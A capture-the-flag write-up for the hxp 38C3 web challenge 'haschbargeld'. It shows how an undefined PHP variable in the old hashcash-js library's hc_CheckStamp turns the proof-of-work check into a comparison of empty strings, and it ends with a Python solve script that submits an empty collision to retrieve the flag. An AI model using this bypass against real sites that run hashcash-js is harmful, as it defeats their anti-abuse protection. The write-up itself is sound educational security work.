# haschbargeld

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- Contributor: @ozetta
- 123 solves / 76 points
- Author: @yyyyyyy
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241230193528.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231195014.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241230193720.png)

When we go to the index page, we are met with an alert box: "we got the setup timed out!" Hmm... No idea what that is.

After clicking off the alert box, we can see that this page has 2 input boxes, a `<textarea>` element, and a "Go!" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241230193906.png)

Let's try to submit some random stuff:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241230194042.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241230194141.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241230194151.png)

When we clicked the "Go!" button, it'll send a POST request to `/post_comment.php` with parameter `hc_stamp`, `hc_contract`, `hc_collision`, `username`, `comment`, and `timeout`.

Again, no idea what it does. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/Web/haschbargeld/haschbargeld-b96b408667d332b4.tar.xz):**
```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld)-[2024.12.30|19:44:10(HKT)]
└> file haschbargeld-b96b408667d332b4.tar.xz 
haschbargeld-b96b408667d332b4.tar.xz: XZ compressed data, checksum CRC64
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld)-[2024.12.30|19:44:11(HKT)]
└> tar xvf haschbargeld-b96b408667d332b4.tar.xz 
haschbargeld/
haschbargeld/Dockerfile
haschbargeld/compose.yml
haschbargeld/flag.txt
haschbargeld/setup.sh
```

Huh, there's no PHP script files after extracting the tar archieve file?

In the `Dockerfile`, it'll run the `setup.sh` Bash script file during building the Docker image:

```bash
[...]
RUN /setup.sh && rm /setup.sh
```

Let's see what it does!

In the first few lines, it'll create the nginx configuration file. In that config, it sets file `makecomment.php` as the index page:

```bash
[...]
cat >/etc/nginx/sites-enabled/default <<EOF
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    root /var/www/html;
    index makecomment.php;
    server_name _;
    location / {
        try_files \$uri \$uri/ =404;
    }
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }
}
EOF
```

Next, it downloads GitHub repository [hashcash-js](https://github.com/007/hashcash-js) to `/var/www/html/` and switch to commit `d967644776e91e37dc45978e801bbf1cddbaaf1c`:

```bash
cd /var/www/html
[...]
git init .
git remote add origin 'https://github.com/007/hashcash-js.git'
git fetch origin d967644776e91e37dc45978e801bbf1cddbaaf1c
git checkout d967644776e91e37dc45978e801bbf1cddbaaf1c
```

After that, it modifies hashcash-js's config file `hc_config.php` and `hashcash.php`:

```bash
sed -i "s!ThIsIsAtEsT!$(md5sum /flag.txt)!" hc_config.php
sed -i s/12/31/ hc_config.php
sed -i s/60/1/ hashcash.php
```

The first `sed` command is to edit the string `ThIsIsAtEsT` to the MD5 hash of the `/flag.txt` file. The second one is to edit string `12` to `31`, and the final one is to edit string `60` to `1`.

Finally, it appends the following PHP code into `post_comment.php`:

```bash
cat >>post_comment.php <<EOF
<?php
include "hashcash.php";
if (hc_CheckStamp()) {
    echo file_get_contents("/flag.txt");
}
?>
EOF
```

In the above PHP code, **if `hc_CheckStamp` returns a truthy value (`true`) or something that is not empty, we can get the flag**.

Hmm... hashcash-js? If we read the `README.md` file in [that GitHub repository](https://github.com/007/hashcash-js?tab=readme-ov-file#hashcash-for-phpjavascript-forms), it says this is a PHP and JavaScript implementation of [Hashcash](http://www.hashcash.org/).

> Hashcash is a proof-of-work algorithm, which has been used as a denial-of-service counter measure technique in a number of systems. - [http://www.hashcash.org/](http://www.hashcash.org/)

Also, it is worth noting that this repository hasn't been updated since 2010. So maybe it has some vulnerabilities?

Let's build the Docker image and find out!

For my convenience, I'll mount a new volume between my host to the Docker container's path `/var/www/html/` by modifying `compose.yml`, so that I can review hashcash-js code better:

```yaml
# docker compose up

services:
  chall:
    build:
      dockerfile: Dockerfile
    restart: unless-stopped
    ports:
      - 30788:80
    volumes:
      - ./hashcash-js:/var/www/html/
```

Then run `docker compose up --build -d` to build and run the Docker container:

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld)-[2024.12.30|20:18:48(HKT)]
└> cd haschbargeld                
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld/haschbargeld)-[2024.12.30|20:19:15(HKT)]
└> docker compose up --build -d
[...]
```

After doing so, path `/var/www/html/` seems like empty?

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld/haschbargeld)-[2024.12.30|20:20:21(HKT)]
└> ls -lah hashcash-js 
total 8.0K
drwxr-xr-x 2 root   root   4.0K Dec 30 20:14 .
drwx------ 3 siunam siunam 4.0K Dec 30 20:08 ..
```

Apparently the `setup.sh` Bash script didn't execute.

Well, we can just do that manually:

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld/haschbargeld)-[2024.12.30|20:22:10(HKT)]
└> docker container list       
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS         PORTS                                       NAMES
bbacbab00062   haschbargeld-chall   "/bin/sh -c '/etc/in…"   2 minutes ago   Up 2 minutes   0.0.0.0:30788->80/tcp, [::]:30788->80/tcp   haschbargeld-chall-1
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld/haschbargeld)-[2024.12.30|20:22:13(HKT)]
└> docker exec -it bbacbab00062 /bin/bash
root@bbacbab00062:/# 
```

```shell
root@bbacbab00062:/# cat >/etc/nginx/sites-enabled/default <<EOF
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    root /var/www/html;
    index makecomment.php;
    server_name _;
    location / {
        try_files \$uri \$uri/ =404;
    }
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }
}
EOF

cd /var/www/html

rm -rf *
root@bbacbab00062:/var/www/html# git init .
git remote add origin 'https://github.com/007/hashcash-js.git'
git fetch origin d967644776e91e37dc45978e801bbf1cddbaaf1c
git checkout d967644776e91e37dc45978e801bbf1cddbaaf1c
rm -rf .git
[...]
```

Also the first `sed` command seems wrong. We can fix it anyway:

```shell
root@bbacbab00062:/var/www/html# sed -i "s/ThIsIsAtEsT/$(md5sum /flag.txt | cut -d ' ' -f1 | tr -d '\n')/" hc_config.php
root@bbacbab00062:/var/www/html# sed -i s/12/31/ hc_config.php
sed -i s/60/1/ hashcash.php

cat >>post_comment.php <<EOF
<?php
include "hashcash.php";
if (hc_CheckStamp()) {
    echo file_get_contents("/flag.txt");
}
?>
EOF
```

Now that we setup the local testing environment, let's review hashcash-js!

If we go to `hashcat.php`, function `hc_CheckStamp` has a lot of validations:

```php
include "hc_config.php";
[...]
// check a stamp
// checks validity, expiration, and contract obligations for a stamp
function hc_CheckStamp()
{
    global $hc_contract, $hc_maxcoll, $hc_stampsize;
    $validstamp = true;
    
    $stamp = $_POST['hc_stamp'];
    $client_con = $_POST['hc_contract'];
    $collision = $_POST['hc_collision'];
    [...]
    if($client_con != $hc_contract) $validstamp = false;                   // valid contract?
    
    if($validstamp) if(strlen($stamp) != $hc_stampsize) $validstamp = false;       // valid stamp?
    
    if($validstamp) if(strlen($collision) > $hc_maxcoll) $validstamp = false;    // valid collision?
    
    if($validstamp) $validstamp = hc_CheckExpiration($stamp);           // stamp expired?
    
    if($validstamp) $validstamp = hc_CheckContract($stamp, $collision, $contract); // collision meets contract?
    
    return $validstamp;
}
```

> Note: For readability, I removed all the debugging stuff.

Let's go through every single if statements one by one!

In the first to the third if statement, it checks our POST parameter `hc_contract`, `hc_stamp`'s length is equals to variable `$hc_contract`, `$hc_stampsize`, and `hc_collision`'s length is less than `$hc_maxcoll` which is defined in `hc_config.php`.

```php
if($client_con != $hc_contract) $validstamp = false;                   // valid contract?

if($validstamp) if(strlen($stamp) != $hc_stampsize) $validstamp = false;       // valid stamp?

if($validstamp) if(strlen($collision) > $hc_maxcoll) $validstamp = false;    // valid collision?
```

`hc_config.php`:

```php
<?php
// user-configurable random string
$hc_salt = "bd62bf9b8eb3c60d92246c3a67efb78c";

// number of bits to collide
$hc_contract = 31;

// maximum length of data to hash
// client can generate 1..$maxcoll characters of data
$hc_maxcoll = 8;

// tolerance, in minutes between stamp generation and expiration
// don't make this too high, CheckPostage() has to calculate $tolerance different hashes
$hc_tolerance = 2;

// size of our hash function output
// in hex numbers - 0x31345 is 5, 0xabc is 3
$hc_stampsize = 8;
?>
```

So, our **POST parameter `hc_contract` must be `31`, `hc_stamp`'s length must be `8`, and `hc_collision`'s length must be less than `8`**.

In the fourth if statement, it checks whether our stamp is expired or not:

```php
if($validstamp) $validstamp = hc_CheckExpiration($stamp);           // stamp expired?
```

```php
// define generic hash function (currently md5)
function hc_HashFunc($x) { return sprintf("%08x", crc32($x)); }
[...]
// hc_CheckExpiration - true = valid, false = expired
function hc_CheckExpiration($a_stamp)
{
    global $hc_salt, $hc_tolerance;

    $expired = true;
    $tempnow = intval(time() / 1);
    $ip = $_SERVER['REMOTE_ADDR'];

    for($i = 0; $i < $hc_tolerance; $i++)
    {
        if($a_stamp === hc_HashFunc(($tempnow - $i) . $ip . $hc_salt))
        {
            $expired = false;
            break;
        }
    }

    return !($expired);
}
```

As you can see, the stamp expiration date can only last for 2 seconds. And the check is done via CRC32 hashing this input: `<current_time_minus_$i><our_ip_address><salt>`.

In the final if statement, it calls function `hc_CheckContract` to check the correct proof-of-work values:

```php
if($validstamp) $validstamp = hc_CheckContract($stamp, $collision, $contract); // collision meets contract?
```

```php
// convert hex numbers to binary strings
function hc_HexInBin($x)
{
    switch($x)
    {
        case '0': $ret = '0000'; break;
        case '1': $ret = '0001'; break;
        case '2': $ret = '0010'; break;
        case '3': $ret = '0011'; break;
        case '4': $ret = '0100'; break;
        case '5': $ret = '0101'; break;
        case '6': $ret = '0110'; break;
        case '7': $ret = '0111'; break;
        case '8': $ret = '1000'; break;
        case '9': $ret = '1001'; break;
        case 'A': $ret = '1010'; break;
        case 'B': $ret = '1011'; break;
        case 'C': $ret = '1100'; break;
        case 'D': $ret = '1101'; break;
        case 'E': $ret = '1110'; break;
        case 'F': $ret = '1111'; break;
        default: $ret = '0000';
    }
    return $ret;
}

function hc_ExtractBits($hex_string, $num_bits)
{
    $bit_string = "";
    $num_chars = ceil($num_bits / 4);
    for($i = 0; $i < $num_chars; $i++)
        $bit_string .= hc_HexInBin(substr($hex_string, $i, 1));

    return substr($bit_string, 0, $num_bits);
}
[...]
// check for collision of $stamp_contract bits for $stamp and $collision
function hc_CheckContract($stamp, $collision, $stamp_contract)
{
    if($stamp_contract >= 32)
        return false;

    $maybe_sum = hc_HashFunc($collision);

    $partone = hc_ExtractBits($stamp, $stamp_contract);
    $parttwo = hc_ExtractBits($maybe_sum, $stamp_contract);

    return (strcmp($partone, $parttwo) == 0);
}
```

In here, it basically checks for CRC32 hash collision between  `$stamp` and `$collision`. If they have collision, it passes the check.

However, if we use an IDE editor, this validation seems broken?

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241230211139.png)

Huh. **Since `$contract` is not defined in anywhere, how does PHP handle this?**

To test this, we can write the following testing PHP script:

`test.php`:

```php
<?php
function foo($bar) {
    var_dump($bar);
}

foo($doesnt_exist);
?>
```

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld/haschbargeld)-[2024.12.30|21:13:58(HKT)]
└> php test.php
PHP Warning:  Undefined variable $doesnt_exist in /home/siunam/ctf/hxp-38C3-CTF/Web/haschbargeld/haschbargeld/test.php on line 6
NULL
```

Huh, it seems like PHP will output a warning, and **parse `null` to the argument**. ~~Average sane PHP quirk~~

So what will happen when function `hc_CheckContract`'s argument `$stamp_contract` is `null`?? Will it return `true`?

```php
function hc_CheckContract($stamp, $collision, $stamp_contract)
{
    if(null >= 32)
        return false;
    [...]
}
```

> Note: I replaced `$stamp_contract` to `null`.

In this if statement, `NULL` is greater and equals to 32, which will not immediately return:

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld/haschbargeld)-[2024.12.30|21:14:13(HKT)]
└> php -a      
[...]
php > var_dump(null >= 32);
bool(false)
```

Then, in function `hc_ExtractBits`, since the second argument is `null`, `ceil(null / 4)` will be `0`:

```php
function hc_ExtractBits($hex_string, $num_bits)
{
    $bit_string = "";
    $num_chars = ceil(null / 4);
    for($i = 0; $i < $num_chars; $i++)
        $bit_string .= hc_HexInBin(substr($hex_string, $i, 1));

    return substr($bit_string, 0, null);
}
[...]
function hc_CheckContract($stamp, $collision, $stamp_contract)
{
    [...]
    $partone = hc_ExtractBits($stamp, null);
    $parttwo = hc_ExtractBits($maybe_sum, null);
    [...]
}
```

```shell
php > var_dump(ceil(null / 4));
float(0)
```

If `$num_chars` is `0`, well then `$bit_string` will be an empty string, which basically means this function will always return an empty string:

```shell
php > var_dump(substr("", 0, null));
string(0) ""
```

Finally, if `$partone` and `$parttwo` are empty string, the `strcmp` will always return `0`. **Therefore, function `hc_CheckContract` will always return `true`**:

```php
function hc_CheckContract($stamp, $collision, $stamp_contract)
{
    [...]
    $partone = hc_ExtractBits($stamp, $stamp_contract);
    $parttwo = hc_ExtractBits($maybe_sum, $stamp_contract);

    return (strcmp($partone, $parttwo) == 0);
}
```

```shell
php > var_dump(strcmp("", ""));
int(0)
php > var_dump(0 == 0);
bool(true)
```

## Exploitation

Armed with the above information, **as long as we have a valid, not expired stamp, we can get the flag**!

How do we get a valid stamp? Well, `makecomment.php` will generate one for us:

```php
<?php include "hashcash.php"; ?>
[...]
<?php hc_CreateStamp(); ?>
```

```php
// generate a stamp
function hc_CreateStamp()
{
    global $hc_salt, $hc_contract, $hc_maxcoll;
    $ip = $_SERVER['REMOTE_ADDR'];
    $now = intval(time() / 1);

    // create stamp
    // stamp = hash of time (in minutes) . user ip . salt value
    $stamp = hc_HashFunc($now . $ip . $hc_salt);

    //embed stamp in page
    echo "<input type=\"hidden\" name=\"hc_stamp\" id=\"hc_stamp\" value=\"" . $stamp . "\" />\n";
    echo "<input type=\"hidden\" name=\"hc_contract\" id=\"hc_contract\" value=\"" . $hc_contract . "\" />\n";
    echo "<input type=\"hidden\" name=\"hc_collision\" id=\"hc_collision\" value=\"" . $hc_maxcoll . "\" />\n";
}
```

So, to get the flag, we need to:
1. Get a valid stamp in `makecomment.php`
2. Send POST parameter `hc_stamp=<valid_stamp>`, `hc_contract=31`, and `hc_collision=<empty_string>`

To automate the above steps, I have written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.GET_FLAG_ENDPOINT = f'{self.baseUrl}/post_comment.php'

    def getStamp(self):
        soup = BeautifulSoup(requests.get(self.baseUrl).text, 'html.parser')
        stamp = soup.find('input', attrs={ 'id': 'hc_stamp' }).attrs['value']
        return stamp

    def getFlag(self, stamp):
        data = {
            'hc_stamp': stamp,
            'hc_contract': '31',
            'hc_collision': ''
        }
        responseText = requests.post(self.GET_FLAG_ENDPOINT, data=data).text
        flag = responseText.split()[-1]
        return flag

    def solve(self):
        stamp = self.getStamp()
        print(f'[+] Valid stamp: {stamp}')

        flag = self.getFlag(stamp)
        print(f'[+] {flag}')

if __name__ == '__main__':
    # baseUrl = 'http://localhost:30788' # for local testing
    baseUrl = 'http://78.47.140.94:30788'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/haschbargeld)-[2024.12.30|21:43:50(HKT)]
└> python3 solve.py
[+] Valid stamp: 150f8cff
[+] hxp{H45H_w4s_s0_C45H}
```

- **Flag: `hxp{H45H_w4s_s0_C45H}`**

## Conclusion

What we've learned:

1. PHP undefined variable quirk